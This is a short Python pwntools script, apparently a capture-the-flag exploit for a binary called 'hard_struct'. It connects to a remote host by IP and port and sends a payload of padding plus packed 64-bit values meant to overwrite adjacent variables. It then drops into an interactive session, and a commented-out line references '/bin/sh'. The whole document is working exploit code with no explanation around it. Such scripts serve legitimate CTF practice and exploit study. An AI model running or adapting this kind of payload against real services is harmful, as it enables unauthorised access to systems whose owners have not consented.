from pwn import *
context(arch='amd64',log_level='debug')
#p=process("./hard_struct")
p=remote('121.40.92.129',28066)
#gdb.attach(p)
#v51='/bin/sh'
#v52=0xc81cd6e631f8a1
v5=0x40c81cd6e631f8a1
v6=0x14
v7=0x40f81cd6e9e1b08a
payload='a'*16+p64(v5)+p64(v6)+p64(v7)
p.sendline(payload)
p.interactive()
